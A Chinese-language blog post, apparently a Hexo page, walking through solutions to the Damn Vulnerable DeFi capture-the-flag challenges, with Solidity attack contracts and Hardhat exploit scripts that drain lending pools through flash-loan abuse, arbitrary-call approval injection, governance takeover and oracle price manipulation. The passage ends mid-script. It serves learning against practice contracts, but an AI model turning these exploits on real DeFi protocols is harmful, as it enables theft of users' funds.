@@ -1,0 +1,630 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Damn vaulnerable Defi 题解 | 影</title><meta name="author" content="shaflow"><meta name="copyright" content="shaflow"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="untoppable本题让我们将合约的闪贷功能阻止观察闪贷过程可以发现 function flashLoan(uint256 borrowAmount) external nonReentrant &amp;#123;     require(borrowAmount &gt; 0, &quot;Must borrow at least one token&quot;);      uint256 bal">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Damn vaulnerable Defi 题解">
+<meta property="og:url" content="http://example.com/2023/02/25/Damn-valurable-defi-sotion/index.html">
+<meta property="og:site_name" content="影">
+<meta property="og:description" content="untoppable本题让我们将合约的闪贷功能阻止观察闪贷过程可以发现 function flashLoan(uint256 borrowAmount) external nonReentrant &amp;#123;     require(borrowAmount &gt; 0, &quot;Must borrow at least one token&quot;);      uint256 bal">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://img0.baidu.com/it/u=471504868,3486654871&fm=253&fmt=auto&app=138&f=JPEG?w=889&h=500">
+<meta property="article:published_time" content="2023-02-25T09:36:20.000Z">
+<meta property="article:modified_time" content="2023-02-25T09:36:24.849Z">
+<meta property="article:author" content="shaflow">
+<meta property="article:tag" content="标签1">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img0.baidu.com/it/u=471504868,3486654871&fm=253&fmt=auto&app=138&f=JPEG?w=889&h=500"><link rel="shortcut icon" href="https://img2.baidu.com/it/u=3673566212,1440065658&fm=253&fmt=auto&app=138&f=PNG?w=751&h=500"><link rel="canonical" href="http://example.com/2023/02/25/Damn-valurable-defi-sotion/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
+  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":230},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: true,
+    post: true
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"Traditional Chinese Activated Manually","cht_to_chs":"Simplified Chinese Activated Manually","day_to_night":"Dark Mode Activated Manually","night_to_day":"Light Mode Activated Manually","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"top-right"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Damn vaulnerable Defi 题解',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-02-25 17:36:24'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const now = new Date()
+          const hour = now.getHours()
+          const isNight = hour <= 6 || hour >= 18
+          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+          else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/construct.css" media="defer" onload="this.media='all'"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-double-row-display@1.00/cardlistpost.min.css"/>
+<style>#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags:before {content:"\A";
+  white-space: pre;}#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags > .article-meta__separator{display:none}</style>
+<link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.css" /><link rel="stylesheet" href="https://www.fomal.cc/static/css/runtime.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiperstyle.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload="this.media='screen'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-filter-gitcalendar/lib/gitcalendar.css" media="print" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img0.baidu.com/it/u=1478036750,1488409170&amp;fm=253&amp;fmt=auto&amp;app=120&amp;f=JPEG?w=800&amp;h=500" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope-open"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://img0.baidu.com/it/u=471504868,3486654871&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=889&amp;h=500')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">影</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><!--span=' '+_p('search.title')--></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope-open"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Damn vaulnerable Defi 题解</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-02-25T09:36:20.000Z" title="Created 2023-02-25 17:36:20">2023-02-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-02-25T09:36:24.849Z" title="Updated 2023-02-25 17:36:24">2023-02-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/solidity-learning/">solidity learning</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">2.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>12min</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Damn vaulnerable Defi 题解"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="untoppable"><a href="#untoppable" class="headerlink" title="untoppable"></a>untoppable</h2><p>本题让我们将合约的闪贷功能阻止<br>观察闪贷过程可以发现</p>
+<pre><code>function flashLoan(uint256 borrowAmount) external nonReentrant &#123;
+    require(borrowAmount &gt; 0, &quot;Must borrow at least one token&quot;);
+
+    uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
+    require(balanceBefore &gt;= borrowAmount, &quot;Not enough tokens in pool&quot;);
+
+    // Ensured by the protocol via the `depositTokens` function
+    assert(poolBalance == balanceBefore);
+
+    damnValuableToken.transfer(msg.sender, borrowAmount);
+
+    IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);
+
+    uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
+    require(balanceAfter &gt;= balanceBefore, &quot;Flash loan hasn&#39;t been paid back&quot;);
+&#125;
+</code></pre><p>其中要求assert(poolBalance == balanceBefore);<br>poolBalance增加是通过depositToken函数<br>而damnValuableToken还有transfer函数可以将代币转入贷款池<br>所以只需要向贷款池转入任意数量的代币 此条件就不成立 闪贷过程就会被assert  </p>
+<pre><code>await this.token.transfer(this.pool.address,INITIAL_ATTACKER_TOKEN_BALANCE);
+</code></pre><hr>
+<h2 id="naive-receiver"><a href="#naive-receiver" class="headerlink" title="naive-receiver"></a>naive-receiver</h2><p>这次的闪贷一次要多花1 ether的费用 题目要求我们耗费完接受者合约的ether<br>观察闪贷过程 闪贷未对borrower 进行检测 所以我们可以任意让拥有配套receiveEther函数的别的合约调用flashloan<br>因此 调用十次flashloan borrwoer填接收器合约地址 就可以完成本题目</p>
+<pre><code>it(&#39;Exploit&#39;, async function () &#123;
+
+    for (i=0;i&lt;10;i++)&#123;
+        this.pool.flashLoan(this.receiver.address,ethers.utils.parseEther(ETHER_IN_POOL));
+    &#125;
+
+&#125;);
+</code></pre><hr>
+<h2 id="Truster"><a href="#Truster" class="headerlink" title="Truster(?)"></a>Truster(?)</h2><p>题目要求取走闪贷合约的ETH<br>观察闪贷过程  </p>
+<pre><code>function flashLoan(
+    uint256 borrowAmount,
+    address borrower,
+    address target,
+    bytes calldata data
+)
+    external
+    nonReentrant
+&#123;
+    uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
+    require(balanceBefore &gt;= borrowAmount, &quot;Not enough tokens in pool&quot;);
+
+    damnValuableToken.transfer(borrower, borrowAmount);
+    target.functionCall(data);
+
+    uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
+    require(balanceAfter &gt;= balanceBefore, &quot;Flash loan hasn&#39;t been paid back&quot;);
+&#125;
+</code></pre><p>它允许以本合约调用任意合约的任意函数<br>如果我们用它来调用damnValunableToken的approve函数  那我们的合约就有了转走pool里eth的权限</p>
+<pre><code>// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+import &#39;contracts/DamnValuableToken.sol&#39;;
+import &#39;./TrusterLenderPool.sol&#39;;
+
+contract trusterAttack&#123;
+    TrusterLenderPool pool;
+    DamnValuableToken token;
+
+    constructor(address add1,address add2) public&#123;
+        pool = TrusterLenderPool(add1);
+        token = DamnValuableToken(add2);
+    &#125;
+
+    function doFlashLoan(uint256 Amount,address borrower,address target,address attacker) public&#123;
+        bytes memory data = abi.encodeWithSignature(&quot;approve(address,uint256)&quot;,address(this) ,Amount);
+        pool.flashLoan(0, borrower, target, data);
+        token.transferFrom(address(pool) , attacker , Amount);
+    &#125;
+&#125;
+
+
+ it(&#39;Exploit&#39;, async function () &#123;
+    /** CODE YOUR EXPLOIT HERE  */
+    const TrusterAttack = await ethers.getContractFactory(&#39;trusterAttack&#39;,attacker);
+    this.AttackContract = await TrusterAttack.deploy(this.pool.address, this.token.address);
+    this.AttackContract.doFlashLoan(TOKENS_IN_POOL,this.AttackContract.address,this.token.address,attacker.address);
+
+&#125;)
+</code></pre><hr>
+<h2 id="side-entrance"><a href="#side-entrance" class="headerlink" title="side-entrance"></a>side-entrance</h2><p>题目要求：取走闪贷合约的所有ETH<br>观察合约，闪贷接受方需要实现IFlashLoanEtherReceiver<br>合约中还有deposit 和 withdraw两个函数对应存钱取钱<br>所以如果用闪贷的钱进行deposit，闪贷可以完成并且余额可以增加<br>闪贷结束后再withdraw就可以完成</p>
+<pre><code>pragma solidity ^0.8.0;
+import &quot;./SideEntranceLenderPool.sol&quot;;
+contract sideAttack&#123;
+    SideEntranceLenderPool pool;
+    uint amount;
+    constructor(address add,uint num) public &#123;
+        pool = SideEntranceLenderPool(add);
+        amount = num;
+    &#125;
+
+    function doFlashloan(uint amount,address addr) public payable&#123;
+        pool.flashLoan(amount);
+        pool.withdraw();
+        selfdestruct(payable(addr));//把钱转给attacker
+    &#125;
+    function execute() external payable&#123;
+        address(pool).call&#123;value: amount&#125;(abi.encodeWithSignature(&quot;deposit()&quot;));
+    &#125;
+    receive() external payable&#123;&#125;
+&#125;
+
+    it(&#39;Exploit&#39;, async function () &#123;
+    /** CODE YOUR EXPLOIT HERE */
+    const SideEntraceAttackFactory = await ethers.getContractFactory(&#39;sideAttack&#39;,attacker);
+    this.attackContract = await SideEntraceAttackFactory.deploy(this.pool.address,ETHER_IN_POOL);
+    this.attackContract.doFlashloan(ETHER_IN_POOL,attacker.address);
+
+&#125;);
+</code></pre><hr>
+<h2 id="the-rewarder"><a href="#the-rewarder" class="headerlink" title="the rewarder"></a>the rewarder</h2><p>在theRewarderPool中，可以观察到如果我们向合约中转入liqToken 合约会为我们铸造accToken 然后按照我们账户accToken 占上一次totalSupply的比重铸造rewardToken（要求每回合只能铸造一次，5天一个回合）<br>其实题目已经提示的很清楚了 通过闪贷贷出大量liqToken 进行deposit，由于liqToken数量很大，所以我们能获得很多rewardToken  </p>
+<pre><code>import &quot;./TheRewarderPool.sol&quot;;
+import &quot;./FlashLoanerPool.sol&quot;;
+import &quot;contracts/DamnValuableToken.sol&quot;;
+import &quot;./RewardToken.sol&quot;;
+pragma solidity ^0.8.0;
+
+contract rewardAttack&#123;
+    FlashLoanerPool pool;
+    DamnValuableToken liqToken;
+    TheRewarderPool rewardpool;
+    RewardToken token;
+
+
+    constructor(address add1,address add2,address add3,address add4) public &#123;
+        pool = FlashLoanerPool(add1);
+        liqToken = DamnValuableToken(add2);
+        rewardpool = TheRewarderPool(add3);
+        token = RewardToken(add4);
+    &#125;
+
+    function attack(uint amount) public&#123;
+        pool.flashLoan(amount);
+    &#125;
+    function receiveFlashLoan(uint256 amount) external&#123;
+        liqToken.approve(address(rewardpool), amount);
+        rewardpool.deposit(amount);
+        rewardpool.withdraw(amount);
+        liqToken.transfer(address(pool), amount);
+
+    &#125;
+    function transfer(address add,uint amount) public&#123;
+        token.transfer(add, amount);//最后把rewardToken转给attacker以通过验证
+    &#125;
+
+
+&#125;
+
+
+it(&#39;Exploit&#39;, async function () &#123;
+    /** CODE YOUR EXPLOIT HERE */
+    await ethers.provider.send(&quot;evm_increaseTime&quot;, [5 * 24 * 60 * 60]);//由于题目需求进入第三回合 所以我们必须先等5天再进行deposit才能触发_recordSnapshot()进入第三回合
+    const RewardAttackFactory = await ethers.getContractFactory(&#39;rewardAttack&#39;,attacker);
+    this.attackContract = await RewardAttackFactory.deploy( this.flashLoanPool.address,this.liquidityToken.address,this.rewarderPool.address,this.rewardToken.address);
+    await this.attackContract.attack(TOKENS_IN_LENDER_POOL);
+    let amount = this.rewardToken.balanceOf(this.attackContract.address);
+    await this.attackContract.transfer(attacker.address,amount);
+
+&#125;);
+</code></pre><h2 id="selfie"><a href="#selfie" class="headerlink" title="selfie"></a>selfie</h2><p>题目要求我们取走贷款池中的所有代币<br>观察贷款合约 drainAllFunds函数可以将贷款池中的所有代币转移给指定地址 预计要用到这个函数完成目标<br>drainAllFunds函数只有governance可以触发<br>观察governance合约 当我们的代币余额大于总供应的一半时，我们可以请求governance合约去完成一些调用<br>这个调用过程是先通过queueAction函数进行调用请求 然后等待ACTION_DELAY_IN_SECONDS也就是两天之后可以通过executeAction函数执行调用<br>在执行调用的过程中没有进行代币余额的检查<br>所以可以想到闪贷贷出池中的所有货币，对governance合约进行 向贷款池调用drainAllFunds 的调用请求，之后把钱还回去<br>等待两天之后执行调用 我们就可以获得贷款池中的所有代币  </p>
+<pre><code>import &quot;./SelfiePool.sol&quot;;
+import &quot;./SimpleGovernance.sol&quot;;
+import &quot;../DamnValuableTokenSnapshot.sol&quot;;
+pragma solidity ^0.8.0;
+
+contract selfieAttack&#123;
+    SelfiePool pool;
+    SimpleGovernance governance;
+    address attacker;
+
+    constructor(address add1,address add2,address add4) public &#123;
+        pool = SelfiePool(add1);
+        governance = SimpleGovernance(add2);
+        attacker = add4;
+    &#125;
+
+    function FlashLoan(uint amount) public&#123;
+        pool.flashLoan(amount);
+    &#125;
+
+    function receiveTokens(address add,uint256 amount) external&#123;
+        add.call(abi.encodeWithSignature(&quot;snapshot()&quot;));
+        bytes memory data = abi.encodeWithSignature(&quot;drainAllFunds(address)&quot;,attacker);
+        governance.queueAction(address(pool),data,0);
+        (bool success,) = add.call(abi.encodeWithSignature(&quot;transfer(address,uint256)&quot;,address(pool),amount));
+        require(success,&quot;call failed&quot;);
+    &#125;
+
+    function doAction(uint Id) public &#123;
+        governance.executeAction(Id);
+    &#125;
+&#125;
+
+it(&#39;Exploit&#39;, async function () &#123;
+    /** CODE YOUR EXPLOIT HERE */
+    const SelfieAttackFactory = await ethers.getContractFactory(&quot;selfieAttack&quot;,attacker);
+    this.AttackContract = await SelfieAttackFactory.deploy(this.pool.address,this.governance.address,attacker.address);
+    await this.AttackContract.FlashLoan(TOKENS_IN_POOL);
+    await ethers.provider.send(&quot;evm_increaseTime&quot;,[2 * 24 * 60 * 60]);
+    await this.AttackContract.doAction(1);
+    &#125;);
+</code></pre><h2 id="puppet"><a href="#puppet" class="headerlink" title="puppet"></a>puppet</h2><p>题目要求：转走贷款池中的所有代币<br>观察贷款池</p>
+<pre><code>function borrow(uint256 borrowAmount) public payable nonReentrant &#123;
+    uint256 depositRequired = calculateDepositRequired(borrowAmount);
+
+    require(msg.value &gt;= depositRequired, &quot;Not depositing enough collateral&quot;);
+
+    if (msg.value &gt; depositRequired) &#123;
+        payable(msg.sender).sendValue(msg.value - depositRequired);
+    &#125;
+
+    deposits[msg.sender] = deposits[msg.sender] + depositRequired;
+
+    // Fails if the pool doesn&#39;t have enough tokens in liquidity
+    require(token.transfer(msg.sender, borrowAmount), &quot;Transfer failed&quot;);
+
+    emit Borrowed(msg.sender, depositRequired, borrowAmount);
+&#125;
+
+function calculateDepositRequired(uint256 amount) public view returns (uint256) &#123;
+    return amount * _computeOraclePrice() * 2 / 10 ** 18;
+&#125;
+
+function _computeOraclePrice() private view returns (uint256) &#123;
+    // calculates the price of the token in wei according to Uniswap pair
+    return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
+&#125;
+</code></pre><p>发现如果想要借走代币，需要抵押相应的ETH，价格与uniswapPair中的ETH和代币储存量有关，如果uniswapPair中代币变多，那么价格就会降低<br>uniswapPair从10 ETH 10 DVTt 开始<br>我们有1000 DVT 和25ETH  </p>
+<pre><code>function tokenToEthOutput(uint256 eth_bought, uint256 max_tokens, uint256 deadline, address buyer, address payable recipient) private returns (uint256) &#123;
+require(deadline &gt;= block.timestamp &amp;&amp; eth_bought &gt; 0);
+uint256 token_reserve = token.balanceOf(address(this));
+uint256 tokens_sold = getOutputPrice(eth_bought, token_reserve, address(this).balance);
+// tokens sold is always &gt; 0
+require(max_tokens &gt;= tokens_sold);
+recipient.transfer(eth_bought);
+require(token.transferFrom(buyer, address(this), tokens_sold));
+emit EthPurchase(buyer, tokens_sold, eth_bought);
+return tokens_sold;
+</code></pre><p>  }</p>
+<p>  function tokenToEthSwapOutput(uint256 eth_bought, uint256 max_tokens, uint256 deadline) public returns (uint256) {<br>    return tokenToEthOutput(eth_bought, max_tokens, deadline, msg.sender, msg.sender);<br>  }  </p>
+<p>调用uniswapPair的tokenToETHSwapOutput可以将代币换为ETH<br>因此我们存入向uniswapPair自己的代币换出ETH，这样pool中的代币价格就变低了 我们就可以borrow了</p>
+<pre><code>it(&#39;Exploit&#39;, async function () &#123;
+
+    const deadline = (await ethers.provider.getBlock(&#39;latest&#39;)).timestamp * 2
+    await this.token.connect(attacker).approve(this.uniswapExchange.address,ATTACKER_INITIAL_TOKEN_BALANCE);
+    const AMOUNT = await ethers.utils.parseEther(&quot;900&quot;)
+    await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(AMOUNT ,1, deadline);
+
+    const value = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+    await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE,&#123;value:value&#125;);
+
+&#125;);
+</code></pre><p><strong>还应该特别注意两点：</strong><br>每个交易都应由attacker发出<br>不能全把自己的token转入<br>因为验证条件需要attacker的代币余额大于POOL_INITIAL_TOKEN_BALANCE</p>
+<h2 id="puppet-v2"><a href="#puppet-v2" class="headerlink" title="puppet-v2"></a>puppet-v2</h2><p>和上一题相比，抵押物成了WETH，也更新了计算价格的方法  </p>
+<pre><code>function calculateDepositOfWETHRequired(uint256 tokenAmount) public view returns (uint256) &#123;
+    return _getOracleQuote(tokenAmount).mul(3) / (10 ** 18);
+&#125;
+
+// Fetch the price from Uniswap v2 using the official libraries
+function _getOracleQuote(uint256 amount) private view returns (uint256) &#123;
+    (uint256 reservesWETH, uint256 reservesToken) = UniswapV2Library.getReserves(
+        _uniswapFactory, address(_weth), address(_token)
+    );
+    return UniswapV2Library.quote(amount.mul(10 ** 18), reservesToken, reservesWETH);
+&#125;
+</code></pre><p>价格为amount<em>reverseWETH</em>3/reverseToken<br>所以uniswapv2中weth越少，token越多 价格越低<br>uniswapv2可以用swap对两种代币进行交换，所以我们把自己的token换为weth就可以完成题目  </p>
+<pre><code>// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+contract puppetv2Attack&#123;
+    address pool;
+    address token;
+    address weth;
+
+    constructor(address add1,address add2,address add3) public&#123;
+        pool = add1;
+        token = add2;
+        weth = add3;
+    &#125;
+    function giveToken(bytes memory data2)public &#123;
+        (bool success,) = weth.call(data2);
+        require(success,&quot;call 2 failed&quot;);
+    &#125;
+
+
+    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) public pure returns (uint amountOut)&#123;
+        require(amountIn &gt; 0, &#39;UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT&#39;);
+        require(reserveIn &gt; 0 &amp;&amp; reserveOut &gt; 0, &#39;UniswapV2Library: INSUFFICIENT_LIQUIDITY&#39;);
+        uint amountInWithFee = amountIn*(997);
+        uint numerator = amountInWithFee*(reserveOut);
+        uint denominator = reserveIn*(1000)+(amountInWithFee);
+        amountOut = numerator / denominator;
+    &#125;//这个是粘贴uniswapLibrary里的计算方法 给出输入 计算输出
+
+
+    function uniswapV2Call(address target,uint256 amount0,uint256 amount1,bytes calldata data) external&#123;
+        (bool success,) = token.call(data);
+        require(success,&quot;call failed&quot;);
+    &#125;
+    receive() external payable&#123;&#125;
+&#125;
+
+   it(&#39;Exploit&#39;, async function () &#123;
+    /** CODE YOUR EXPLOIT HERE */
+    const ATTACKER_TOKEN_TO_SWAP = ethers.utils.parseEther(&#39;9999&#39;);
+    const value = ethers.utils.parseEther(&#39;19.9&#39;);
+    await this.weth.connect(attacker).deposit(&#123;value:  value&#125;);
+    const AttackContractFactory = await ethers.getContractFactory(&quot;puppetv2Attack&quot;,attacker);
+    this.AttackContract = await AttackContractFactory.deploy(this.uniswapExchange.address,this.token.address,this.weth.address);
+    //计算数据 部署合约准备
+
+    await this.token.connect(attacker).transfer(this.AttackContract.address,ATTACKER_TOKEN_TO_SWAP);
+    const amountOut = await this.AttackContract.getAmountOut(ATTACKER_TOKEN_TO_SWAP,UNISWAP_INITIAL_TOKEN_RESERVE,UNISWAP_INITIAL_WETH_RESERVE);
+    //计算输出
+
+    const data = web3.eth.abi.encodeFunctionCall(&#123;
+        name: &#39;transfer&#39;,
+        type: &#39;function&#39;,
+        inputs:[&#123;
+            type: &#39;address&#39;,
+            name: &#39;add&#39;
+        &#125;,&#123;
+            type: &#39;uint256&#39;,
+            name: &#39;amount&#39;
+        &#125;]
+    &#125;,[this.uniswapExchange.address,ATTACKER_TOKEN_TO_SWAP]);
+    await this.uniswapExchange.connect(attacker).swap(0,amountOut,this.AttackContract.address,data)
+    //进行交换
+
+    const amount1 = await this.weth.balanceOf(this.AttackContract.address);
+    const data2 = web3.eth.abi.encodeFunctionCall(&#123;
+        name: &#39;transfer&#39;,
